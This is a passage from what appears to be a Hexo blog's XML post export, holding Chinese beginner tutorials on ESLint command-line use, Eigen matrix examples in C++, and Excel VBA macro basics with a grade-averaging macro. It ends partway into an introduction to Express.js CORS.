]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>ESLint工具入门教程</title>
    <url>/2019/07/27/ESLint%E5%B7%A5%E5%85%B7%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>ESLint最初是由Nicholas C. Zakas 于2013年6月创建的开源项目。它的目标是提供一个插件化的javascript代码检测工具。</p>
<p>ESLint 是在 ECMAScript/JavaScript 代码中识别和报告模式匹配的工具，它的目标是保证代码的一致性和避免错误。在许多方面，它和 JSLint、JSHint 相似，除了少数的例外：</p>
<ul>
<li>ESLint 使用 Espree 解析 JavaScript。</li>
<li>ESLint 使用 AST 去分析代码中的模式</li>
<li>ESLint 是完全插件化的。每一个规则都是一个插件并且你可以在运行时添加更多的规则。</li>
</ul>
<h1 id="用户指南"><a href="#用户指南" class="headerlink" title="用户指南"></a>用户指南</h1><p>先决条件：Node.js (&gt;=6.14), npm version 3+。</p>
<p>你可以使用 npm 安装 ESLint：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install eslint --save-dev</span><br></pre></td></tr></table></figure>

<p>紧接着你应该设置一个配置文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;node_modules&#x2F;.bin&#x2F;eslint --init</span><br></pre></td></tr></table></figure>

<p>之后，你可以在任何文件或目录上运行ESLint如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;node_modules&#x2F;.bin&#x2F;eslint yourfile.js</span><br></pre></td></tr></table></figure>

<p>也可以在全局而不是本地安装 ESLint (使用 npm install eslint –global)。但是，你使用的任何插件或可共享配置都必须安装在本地。</p>
<h1 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h1><p>命令行工具有几个选项，你可以通过运行 eslint -h 查看所有选项。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eslint [options] file.js [file.js] [dir]</span><br><span class="line"></span><br><span class="line">Basic configuration:</span><br><span class="line">  --no-eslintrc                  Disable use of configuration from .eslintrc.*</span><br><span class="line">  -c, --config path::String      Use this configuration, overriding .eslintrc.* config options if present</span><br><span class="line">  --env [String]                 Specify environments</span><br><span class="line">  --ext [String]                 Specify JavaScript file extensions - default: .js</span><br><span class="line">  --global [String]              Define global variables</span><br><span class="line">  --parser String                Specify the parser to be used</span><br><span class="line">  --parser-options Object        Specify parser options</span><br><span class="line">  --resolve-plugins-relative-to path::String  A folder where plugins should be resolved from, CWD by default</span><br><span class="line"></span><br><span class="line">Specifying rules and plugins:</span><br><span class="line">  --rulesdir [path::String]      Use additional rules from this directory</span><br><span class="line">  --plugin [String]              Specify plugins</span><br><span class="line">  --rule Object                  Specify rules</span><br><span class="line"></span><br><span class="line">Fixing problems:</span><br><span class="line">  --fix                          Automatically fix problems</span><br><span class="line">  --fix-dry-run                  Automatically fix problems without saving the changes to the file system</span><br><span class="line">  --fix-type Array               Specify the types of fixes to apply (problem, suggestion, layout)</span><br><span class="line"></span><br><span class="line">Ignoring files:</span><br><span class="line">  --ignore-path path::String     Specify path of ignore file</span><br><span class="line">  --no-ignore                    Disable use of ignore files and patterns</span><br><span class="line">  --ignore-pattern [String]      Pattern of files to ignore (in addition to those in .eslintignore)</span><br><span class="line"></span><br><span class="line">Using stdin:</span><br><span class="line">  --stdin                        Lint code provided on &lt;STDIN&gt; - default: false</span><br><span class="line">  --stdin-filename String        Specify filename to process STDIN as</span><br><span class="line"></span><br><span class="line">Handling warnings:</span><br><span class="line">  --quiet                        Report errors only - default: false</span><br><span class="line">  --max-warnings Int             Number of warnings to trigger nonzero exit code - default: -1</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">  -o, --output-file path::String  Specify file to write report to</span><br><span class="line">  -f, --format String            Use a specific output format - default: stylish</span><br><span class="line">  --color, --no-color            Force enabling&#x2F;disabling of color</span><br><span class="line"></span><br><span class="line">Inline configuration comments:</span><br><span class="line">  --no-inline-config             Prevent comments from changing config or rules</span><br><span class="line">  --report-unused-disable-directives  Adds reported errors for unused eslint-disable directives</span><br><span class="line"></span><br><span class="line">Caching:</span><br><span class="line">  --cache                        Only check changed files - default: false</span><br><span class="line">  --cache-file path::String      Path to the cache file. Deprecated: use --cache-location - default: .eslintcache</span><br><span class="line">  --cache-location path::String  Path to the cache file or directory</span><br><span class="line"></span><br><span class="line">Miscellaneous:</span><br><span class="line">  --init                         Run config initialization wizard - default: false</span><br><span class="line">  --debug                        Output debugging information</span><br><span class="line">  -h, --help                     Show help</span><br><span class="line">  -v, --version                  Output the version number</span><br><span class="line">  --print-config path::String    Print the configuration for the given file</span><br></pre></td></tr></table></figure>

<h2 id="修复警告和错误"><a href="#修复警告和错误" class="headerlink" title="修复警告和错误"></a>修复警告和错误</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eslint --fix file.js [file.js] [dir]</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://cn.eslint.org/" target="_blank" rel="noopener">ESLint 可组装的JavaScript和JSX检查工具</a>,by ESLint homepage.</li>
<li><a href="http://obkoro1.com/web_accumulate/accumulate/tool/Eslint%E8%87%AA%E5%8A%A8%E4%BF%AE%E5%A4%8D%E6%A0%BC%E5%BC%8F%E9%94%99%E8%AF%AF.html#vscode%E4%BF%9D%E5%AD%98%E6%97%B6%E8%87%AA%E5%8A%A8%E4%BF%AE%E5%A4%8Deslint%E9%94%99%E8%AF%AF" target="_blank" rel="noopener">VsCode保存时自动修复Eslint错误</a>,by 前端进阶积累.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>Eigen入门教程</title>
    <url>/2019/11/27/Eigen%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>Eigen是用于线性代数的C ++模板库，包括矩阵，向量，数值求解器和相关算法。</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>从<a href="http://eigen.tuxfamily.org/index.php?title=Main_Page#Download" target="_blank" rel="noopener">Eigen官网</a>下载最新的Eigen版本。解压Eigen，然后使用Cmake进行配置并生成Visual Studio 15 2017的工程。打开解决方案，先生成ALL_BUILD工程，再生成INSTALL工程，则安装Eigen完毕。将在安装路径下生成Eigen的头文件。</p>
<p>当然也可以不编译安装，直接将Eigen源代码目录下的Eigen子目录复制到Include文件夹即可。</p>
<h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h2 id="运行时推断矩阵尺寸示例"><a href="#运行时推断矩阵尺寸示例" class="headerlink" title="运行时推断矩阵尺寸示例"></a>运行时推断矩阵尺寸示例</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;Eigen&#x2F;Dense&gt;</span><br><span class="line">using namespace Eigen;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  MatrixXd m &#x3D; MatrixXd::Random(3,3);</span><br><span class="line">  m &#x3D; (m + MatrixXd::Constant(3,3,1.2)) * 50;</span><br><span class="line">  cout &lt;&lt; &quot;m &#x3D;&quot; &lt;&lt; endl &lt;&lt; m &lt;&lt; endl;</span><br><span class="line">  VectorXd v(3);</span><br><span class="line">  v &lt;&lt; 1, 2, 3;</span><br><span class="line">  cout &lt;&lt; &quot;m * v &#x3D;&quot; &lt;&lt; endl &lt;&lt; m * v &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="编译时确定矩阵尺寸示例"><a href="#编译时确定矩阵尺寸示例" class="headerlink" title="编译时确定矩阵尺寸示例"></a>编译时确定矩阵尺寸示例</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;Eigen&#x2F;Dense&gt;</span><br><span class="line">using namespace Eigen;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  Matrix3d m &#x3D; Matrix3d::Random();</span><br><span class="line">  m &#x3D; (m + Matrix3d::Constant(1.2)) * 50;</span><br><span class="line">  cout &lt;&lt; &quot;m &#x3D;&quot; &lt;&lt; endl &lt;&lt; m &lt;&lt; endl;</span><br><span class="line">  Vector3d v(1,2,3);</span><br><span class="line">  </span><br><span class="line">  cout &lt;&lt; &quot;m * v &#x3D;&quot; &lt;&lt; endl &lt;&lt; m * v &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://eigen.tuxfamily.org/dox/GettingStarted.html" target="_blank" rel="noopener">Getting started</a>,by eigen home.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Excel宏编程简易教程</title>
    <url>/2019/07/16/Excel%E5%AE%8F%E7%BC%96%E7%A8%8B%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>期末了，媳妇计算学生平时成绩好辛苦，于是准备编写Excel宏程序提高媳妇工作的效率，节省时间。于是简单记录Excel宏编程的相关知识。</p>
<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>为了编写Excel宏，首先需要了解一些基本概念：</p>
<h2 id="工作簿"><a href="#工作簿" class="headerlink" title="工作簿"></a>工作簿</h2><p>工作簿相关概念有：Workbooks、Workbook、ActiveWorkbook、ThisWorkbook。</p>
<ul>
<li><p>Workbooks集合包含excel中所有当前打开的excel工作簿，亦即所有打开的excel文件；</p>
</li>
<li><p>Workbook对应Workbooks中的成员，即其中的excel文件；</p>
</li>
<li><p>ActiveWorkbook代表当前处于活动状态的工作簿，即当前显示的excel文件；</p>
</li>
<li><p>ThisWorkbook代表其中有Visual Basic代码正在运行的工作簿。</p>
</li>
</ul>
<p>在具体使用中可用Workbooks(index)来引用Workbook对象，其中index为工作簿名称或编号，如Workbooks(1)、 Workbooks(“年度报表.xls”)。而编号按照创建或打开工作簿的顺序来确定，第一个打开的工作簿编号为1，第二个打开的工作簿为2……。</p>
<h2 id="工作表"><a href="#工作表" class="headerlink" title="工作表"></a>工作表</h2><p>工作表相关概念有：Worksheets、Worksheet、ActiveSheet。</p>
<ul>
<li><p>Worksheets集合包含工作簿中所有的工作表，即一个excel文件中的所有数据表页；</p>
</li>
<li><p>Worksheet则代表其中的一个工作表；</p>
</li>
<li><p>ActiveSheet代表当前处于的活动状态工作表，即当前显示的一个工作表。</p>
</li>
</ul>
<h2 id="图表"><a href="#图表" class="headerlink" title="图表"></a>图表</h2><p>图表相关概念有：Chart 、Charts、ChartObject、ChartObjects、ActiveChart。</p>
<ul>
<li><p>Chart代表工作簿中的图表。该图表既可为嵌入式图表（包含在ChartObject中），也可为一个分开的（单独的）图表工作表。</p>
</li>
<li><p>Charts代表指定工作簿或活动工作簿中所有图表工作表的集合，但不包括嵌入式在工作表或对话框编辑表中的图表。使用Charts(index) 可引用单个Chart图表，其中index是该图表工作表的索引号或名称；如Charts(1)、Charts(“销售图表”)。</p>
</li>
<li><p>ChartObject代表工作表中的嵌入式图表，其作用是作为Chart对象的容器。利用ChartObject可以控制工作表上嵌入式图表的外观和尺寸。</p>
</li>
<li><p>ChartObjects代表指定的图表工作表、对话框编辑表或工作表上所有嵌入式图表的集合。</p>
</li>
</ul>
<h2 id="单元格"><a href="#单元格" class="headerlink" title="单元格"></a>单元格</h2><p>单元格相关概念有：Cells、ActiveCell、Range、Areas。</p>
<ul>
<li><p>Cells(row,column)代表单个单元格，其中row为行号，column为列号。如可以用Cells(1,1)、Cells(10,4)来引用”A1”、”D10” 单元格。</p>
</li>
<li><p>ActiveCell代表活动工作表的活动单元格，或指定工作表的活动单元格。</p>
</li>
<li><p>Range代表工作表中的某一单元格、某一行、某一列、某一选定区域（该选定区域可包含一个或若干连续单元格区域）或者某一三维区域。可用Range(arg)来引用单元格或单元格区域，其中arg可为单元格号、单元格号范围、单元格区域名称。如Range(“A5”)、 Range(“A1:H8”)、Range(“Criteria”)。虽然可用Range(“A1”)返回单元格A1，但用Cells更方便，因为此时可 用变量指定行和列。</p>
</li>
<li><p>Areas 为选定区域内的连续单元格块的集合，其成员是Range对象。</p>
</li>
</ul>
<h2 id="行与列"><a href="#行与列" class="headerlink" title="行与列"></a>行与列</h2><p>行与列相关概念有：Rows、Columns、Row、Column。</p>
<p>Rows、Columns分别代表活动工作表、单元格区域范围Range、指定工作表中的所有行数、列数。</p>
<h1 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h1><p>Visual Basic for Applications（VBA）是一种Visual Basic的一种宏语言，主要能用来扩展Windows的应用程序功能，特别是Microsoft Office软件。也可说是一种应用程序视觉化的Basic Sc​​ript。 1994年发行的Excel 5.0版本中，即具备了VBA的宏功能。Excel宏编程主要使用VBA。</p>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h3><p>即Primary Type Data，下述列表的括号内为字节数：</p>
<ul>
<li>Byte (1)：无符号类型，取值范围0-255</li>
<li>Boolean (2)</li>
<li>Integer (2)</li>
<li>Long (4)</li>
<li>Single (4)</li>
<li>Double (8)</li>
<li>Currency (8)</li>
<li>Decimal (14)</li>
<li>Date (8)</li>
<li>String</li>
<li>Object (4)</li>
<li>Variant （根据分配确定）</li>
</ul>
<h3 id="自定义的数据类型"><a href="#自定义的数据类型" class="headerlink" title="自定义的数据类型"></a>自定义的数据类型</h3><p>相当于C语言的struct，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Type 自定义类型名</span><br><span class="line">     元素名  As 类型</span><br><span class="line">      …</span><br><span class="line">     [元素名 As 类型]</span><br><span class="line">End Type</span><br></pre></td></tr></table></figure>

<h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Option Base 0 &#39;數組索引值從0開始</span><br><span class="line">Option Base 1 &#39;數組索引值從1開始</span><br><span class="line">Dim MyArray(10) &#39;聲明一個數組變量，10是最大的可用的數組索引值</span><br><span class="line">MyArray(5) &#x3D; 101 &#39;給數組的元素賦值</span><br><span class="line">Dim Data(10,5) &#39;聲明一個二維數組變量</span><br><span class="line">Data(1,1) &#x3D; &quot;A001&quot; &#39;給數組元素賦值</span><br><span class="line">Dim cArr(-11 To 20, 1 To 3) As String &#39;聲明一個數組，定義數組索引值的上下界</span><br><span class="line">Dim dArr() As String &#39;聲明動態數組</span><br><span class="line">ReDim dArr(0 To 5, 1 To 2) &#39;改變動態數組的尺寸默認把原數據清除。如果保留原來的數據，必須加上參數Preserve。</span><br><span class="line">                                &#39;使用Preserve參數時只能改變最後一維的大小</span><br><span class="line">If UBound(vTemp) &#x3D; -1 Then</span><br><span class="line">     &#39;判斷數組變量vTemp是否為 空數組</span><br><span class="line">End If</span><br><span class="line">Erase MyArrar, Data &#39;Eras​​e語句清除數組元素，釋放變量佔用的空間</span><br></pre></td></tr></table></figure>

<h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><p>日期常量由符号“#”将字符括起来，如#2012-1-1#。</p>
<p>系统定义常量有3个：True、False和Null。</p>
<p>固有常量是编程时引用的对象库定义的常量。所有固有常量都可以在宏或VBA代码中使用。通常，固有常量通过前两个字母来指明定义该常量。来自VB库的常量则以“vb”开头。来自Access的常量以“ac”开头。可以使用对象浏览器来查看所有对象库中的固有常量列表。</p>
<p>可以自行定义常量。如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Global Const 符号常量名称 &#x3D; 常量值</span><br></pre></td></tr></table></figure>

<h2 id="控制结构"><a href="#控制结构" class="headerlink" title="控制结构"></a>控制结构</h2><h3 id="if-语句"><a href="#if-语句" class="headerlink" title="if 语句"></a>if 语句</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if 條件1 then</span><br><span class="line">   語句1</span><br><span class="line">elseif 條件2 then</span><br><span class="line">   語句2</span><br><span class="line">elseif ...</span><br><span class="line">    ...</span><br><span class="line">else</span><br><span class="line">   語句n</span><br><span class="line">end if</span><br></pre></td></tr></table></figure>

<h3 id="Select-Case-语句"><a href="#Select-Case-语句" class="headerlink" title="Select Case 语句"></a>Select Case 语句</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Select Case 表達式</span><br><span class="line">   Case 表達式列表1</span><br><span class="line">       語句1</span><br><span class="line">   Case 表達式列表2</span><br><span class="line">       語句2</span><br><span class="line">       ...</span><br><span class="line">   Case 表達式列表n</span><br><span class="line">       語句n</span><br><span class="line">End Select</span><br></pre></td></tr></table></figure>

<h3 id="Do…Loop-语句"><a href="#Do…Loop-语句" class="headerlink" title="Do…Loop 语句"></a>Do…Loop 语句</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Do While或Until 條件</span><br><span class="line">   語句塊1</span><br><span class="line">   Exit Do</span><br><span class="line">   語句塊2</span><br><span class="line">Loop</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Do</span><br><span class="line">   語句塊1</span><br><span class="line">   Exit Do</span><br><span class="line">   語句塊2</span><br><span class="line">Loop While或Until 條件</span><br></pre></td></tr></table></figure>

<h3 id="For…Next语句"><a href="#For…Next语句" class="headerlink" title="For…Next语句"></a>For…Next语句</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">For 循環控制變量&#x3D;初值To 終值Step 步長</span><br><span class="line">   語句塊 ‘Exit For語句可以跳出循環體</span><br><span class="line">Next</span><br></pre></td></tr></table></figure>

<h3 id="For-Each-…-Next语句"><a href="#For-Each-…-Next语句" class="headerlink" title="For Each … Next语句"></a>For Each … Next语句</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">For Each 循環控制變量 In 集合變量</span><br><span class="line">   語句塊 </span><br><span class="line">   Exit For語句可以跳出循環體</span><br><span class="line">Next 循環控制變量</span><br></pre></td></tr></table></figure>

<h3 id="跳出本次循环的continue语句"><a href="#跳出本次循环的continue语句" class="headerlink" title="跳出本次循环的continue语句"></a>跳出本次循环的continue语句</h3><p>VBA没有类似C语言的continue语句。通常可如此写程序：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">For 循環控制變量&#x3D;初值 To 終值 Step 步長</span><br><span class="line">   Do &#39;用于模拟continue</span><br><span class="line">       語句塊 </span><br><span class="line">       If 条件 Then Exit Do &#39;用于模拟continue</span><br><span class="line">       語句塊 </span><br><span class="line">   Loop While False &#39;用于模拟continue</span><br><span class="line">Next</span><br></pre></td></tr></table></figure>

<h3 id="With语句"><a href="#With语句" class="headerlink" title="With语句"></a>With语句</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">With 對象引用</span><br><span class="line">   語句塊</span><br><span class="line">End With</span><br></pre></td></tr></table></figure>

<h3 id="On-Error语句"><a href="#On-Error语句" class="headerlink" title="On Error语句"></a>On Error语句</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">On Error Goto 出錯處理語句的label &#39;跳轉到出錯處理語句</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">On Error Resume Next &#39;遇到錯誤，不管錯誤，繼續往下執行</span><br></pre></td></tr></table></figure>

<h2 id="过程与函数"><a href="#过程与函数" class="headerlink" title="过程与函数"></a>过程与函数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sub 過程名(參數表)</span><br><span class="line">    語句塊</span><br><span class="line">    Exit Sub</span><br><span class="line">    語句塊</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Function 函數名(參數表) As Type</span><br><span class="line">   語句塊</span><br><span class="line">   函數名&#x3D;表達式</span><br><span class="line">   Exit Function</span><br><span class="line">End Function</span><br></pre></td></tr></table></figure>

<h2 id="常用内置函数"><a href="#常用内置函数" class="headerlink" title="常用内置函数"></a>常用内置函数</h2><p>VBA的常用内置函数列表:</p>
<ul>
<li>MsgBox</li>
<li>InputBox</li>
<li>舍入函数：Fix 向0取整,Int向下取整, Round四舍五入</li>
<li>Rnd 返回0-1内的单精度随机数</li>
<li>字符串函数：<ul>
<li>Filter：对字符串的一维数组的过滤</li>
<li>InStr([Start, ]<Str1>,<Str2>[, Compare])与InStrRev： 查找子串</li>
<li>Len 字符串长度</li>
<li>Join：连接一维数组中的所有子字符串</li>
<li>Left,Right,Mid 截取子字符串</li>
<li>Space(数值) 生成空格字符串</li>
<li>Ucase,Lcase 大小写转换函数</li>
<li>Ltrim, Rtrim,Trim 删除首尾空格</li>
<li>Replace</li>
<li>Split：分割一个字符串成为一维数组</li>
<li>StrComp：字符串比较</li>
<li>StrConv：字符串转换</li>
<li>String(number, character)：制定字符重复若干次</li>
<li>StrReverse</li>
</ul>
</li>
<li>日期/时间有关函数：<ul>
<li>Year, Month, Day, WeekDay,Hour,Minute,Second 截取日期时间分量</li>
<li>DateAdd 日期/时间增量函数</li>
<li>DateDiff(&lt;间隔类型&gt;,&lt;日期1&gt;,&lt;日期2&gt;[,W1][,W2])日期/时间的距离函数</li>
<li>DatePart(&lt;分割类型&gt;,&lt;日期&gt;[,w1][,w2])时间分割函数</li>
<li>DateSerial(&lt;表达式1&gt;,&lt;表达式2&gt;,&lt;表达式3&gt;) 合成日期；DateValue(“字符串表达式”)返回日期；</li>
<li>Date,Time,Now,Timer 返回日期时间</li>
<li>DateValue</li>
<li>TimeSerial：由时间序列得到时间对象</li>
<li>TimeValue：由时间字符串得到时间对象</li>
<li>Weekday：获得日期的周几</li>
<li>WeekdayName</li>
</ul>
</li>
<li>转换函数：CBool、CByte、CCur、 CDate、 CDbl、CDec、CInt、 CLng、CLngLng、CLngPtr、CSng、CStr、CVar、CVErr、Asc(&lt;字符串表达式&gt;)返回第一个字符的Ascii编码值、Chr(ASCII码)返回字符、Hex、Oct、Str(&lt;数值表达式&gt;)返回字符串、Val(string)、Format、FormatCurrency、FormatDateTime、FormatNumber、FormatPercent、MonthName</li>
<li>Nz(表达式或字段属性值[,规定值])如果是空，则返回0或者””或者函数的第二个参数值</li>
<li>验证函数：isNumeric、isDate、isNull、isEmpty IsArray、IsError、IsMissing、IsObject</li>
<li>数学函数：Abs、Sqr、Tan、Atn（即atan）、Sin、Cos、Exp（e为基的指数）、Log自然对数</li>
<li>Array:构造一个Array对象</li>
<li>CallByName: get or set a property, or invoke a method at run time using a string name.</li>
<li>控制流：Choose:类似于C语言的select语句、IIf相当于IF-ELSE语句、Switch</li>
<li>Command：获取命令行参数</li>
<li>CreateObject：创建ActiveX对象</li>
<li>CurDir：返回指定驱动器的当前工作路径</li>
<li>由基本数学函数导出的函数：Sec、Cosec、Cotangent、Cotan、Arcsin、Arccos、Arcsec、Arccosec、Arccotan、HSin、HCos、HTan、HSec、HCosec、HCotan、HArcsin、HArccos、HArctan、HArcsec、HArccosec、HArccotan、LogN</li>
<li>DoEvents：暂时把CPU控制权交回给系统。</li>
<li>Environ：返回环境变量的值</li>
<li>文件操作：<ul>
<li>Dir：返回满足条件的所有文件、目录的名字</li>
<li>EOF</li>
<li>FileAttr</li>
<li>FileDateTime</li>
<li>FileLen</li>
<li>FreeFile Function</li>
<li>GetAttr：返回文件、目录的属性值</li>
<li>Input：读取文件</li>
<li>Loc：文件指针位置</li>
<li>LOF：文件打开时的指针位置</li>
<li>Seek：文件指针定位</li>
<li>Spc：使用Print做position output</li>
<li>Tab：用于Print函数</li>
<li>Error:错误号对应的错误消息</li>
<li>Windows Registry中的数据：GetAllSettings、SaveSetting、DeleteSetting、GetSetting</li>
<li>GetObject：ActiveX组建的引用</li>
<li>IMEStatus：返回当前Input Method Editor (IME)。</li>
<li>Macintosh平台：MacID、MacScript</li>
</ul>
</li>
<li>金融函数：<ul>
<li>DDB：使用double-declining balance计算贬值</li>
<li>FV:计算固定利率的年金</li>
<li>IPmt：计算利率</li>
<li>IRR：计算利率</li>
<li>MIRR：计算利率</li>
<li>NPer：计算周期数</li>
<li>NPV：计算net present value</li>
<li>Pmt：计算支付数</li>
<li>PPmt：计算本金支付数</li>
<li>PV：计算present value</li>
<li>Rate：利息率</li>
<li>SLN：straight-line depreciation</li>
<li>SYD：计算sum-of-years’ digits depreciation</li>
</ul>
</li>
<li>Partition：返回字符串，表示一个数值名字落在各个range内。常用于SQL select语句</li>
<li>QBColor：颜色值</li>
<li>RGB：颜色值</li>
<li>TypeName：得到变量的类型名</li>
<li>VarType：得到变量的类型数</li>
</ul>
<h2 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h2><p>比较特殊的运算符有指数运算^，浮点除法/，整数除法\，取模运算Mod，不等逻辑比较运算&lt;&gt;</p>
<h1 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h1><p>在Excel开发工具中点击录制宏，生成一个VBA过程，创建如下代码计算学生平均成绩：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sub 计算平均成绩()</span><br><span class="line">&#39;</span><br><span class="line">&#39; 计算平均成绩 宏</span><br><span class="line">&#39; 计算平均成绩</span><br><span class="line">&#39;</span><br><span class="line">&#39; 快捷键: Ctrl+l</span><br><span class="line">&#39;</span><br><span class="line">    Application.Goto Reference:&#x3D;&quot;计算平均成绩&quot;</span><br><span class="line">    </span><br><span class="line">    Dim count As Integer &#39; 统计学生总数</span><br><span class="line">    count &#x3D; Range(&quot;A1&quot;).CurrentRegion.Rows.count &#39; 统计学生总数</span><br><span class="line">    </span><br><span class="line">    ActiveSheet.Cells(1, &quot;E&quot;).Value &#x3D; &quot;平均成绩&quot;</span><br><span class="line">    Dim workSocre  As Double &#39; 课程分</span><br><span class="line">    Dim videoScore As Double &#39; 视频分</span><br><span class="line">    Dim discussScore As Double &#39; 讨论分</span><br><span class="line">    </span><br><span class="line">    For i &#x3D; 2 To count</span><br><span class="line">        &#39; 计算学生平均成绩</span><br><span class="line">        workSocre &#x3D; ActiveSheet.Cells(i, &quot;A&quot;).Value</span><br><span class="line">        videoScore &#x3D; ActiveSheet.Cells(i, &quot;B&quot;).Value</span><br><span class="line">        discussScore &#x3D; Discuss(ActiveSheet.Cells(i, &quot;C&quot;).Value)</span><br><span class="line">        ActiveSheet.Cells(i, &quot;E&quot;).Value &#x3D; workSocre * 0.6 + videoScore * 100 * 0.2 + discussScore * 0.2</span><br><span class="line">    Next</span><br><span class="line">    MsgBox (&quot;平均成绩计算完成!&quot;)</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Function Discuss(discussCount As Integer) As Integer</span><br><span class="line">    Dim score As Integer</span><br><span class="line">    Select Case discussCount</span><br><span class="line">        Case Is &gt;&#x3D; 20</span><br><span class="line">        score &#x3D; 100</span><br><span class="line">        Case Is &gt;&#x3D; 15</span><br><span class="line">        score &#x3D; 80</span><br><span class="line">        Case Is &gt;&#x3D; 10</span><br><span class="line">        score &#x3D; 60</span><br><span class="line">        Case Is &gt;&#x3D; 5</span><br><span class="line">        score &#x3D; 40</span><br><span class="line">        Case Is &gt; 0</span><br><span class="line">        score &#x3D; 20</span><br><span class="line">        Case Is &#x3D; 0</span><br><span class="line">        score &#x3D; 0</span><br><span class="line">    End Select</span><br><span class="line">    Discuss &#x3D; score</span><br><span class="line">End Function</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/lyhdream/article/details/9060801" target="_blank" rel="noopener">Excel宏教程 (宏的介绍与基本使用)</a>,by 远洪.</li>
<li><a href="https://zh.wikipedia.org/wiki/Visual_Basic_for_Applications" target="_blank" rel="noopener">Visual Basic for Applications</a>,by wikipedia.</li>
<li><a href="https://www.jianshu.com/p/bd760f3c82fd" target="_blank" rel="noopener">VBA——Range操作</a>,by 风之工程师.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>语法</tag>
        <tag>VBA</tag>
      </tags>
  </entry>
  <entry>
    <title>Expressjs cors入门简介</title>
    <url>/2019/07/24/Expressjs-cors%E5%85%A5%E9%97%A8%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>在nodejs+expressjs+vuejs的解决方案中，服务器端应用开发和前端应用的开发是独立的。不过前端应用调用服务器端应用的RESTful API时涉及跨域资源访问，因此需要添加expressjs的cors模块。下面简要介绍cors模块的使用方法。</p>
<h1 id="跨域资源共享简介"><a href="#跨域资源共享简介" class="headerlink" title="跨域资源共享简介"></a>跨域资源共享简介</h1><p>跨域资源共享（CORS）是一种机制，允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。网页可以自由嵌入跨源图像，样式表，脚本，iframe和视频。但某些“跨域”请求，尤其是Ajax请求，默认情况下是由同源安全策略禁止的。</p>
<p>CORS定义了一种浏览器和服务器可以交互的方式，以确定允许跨源请求是否安全。它允许比纯粹的同源请求更多的自由和功能，但比简单地允许所有跨源请求更安全。 CORS规范最初是作为W3C建议书发布的，但该文件已经过时。目前主动维护的CORS定义规范是WHATWG的Fetch Living Standard。</p>
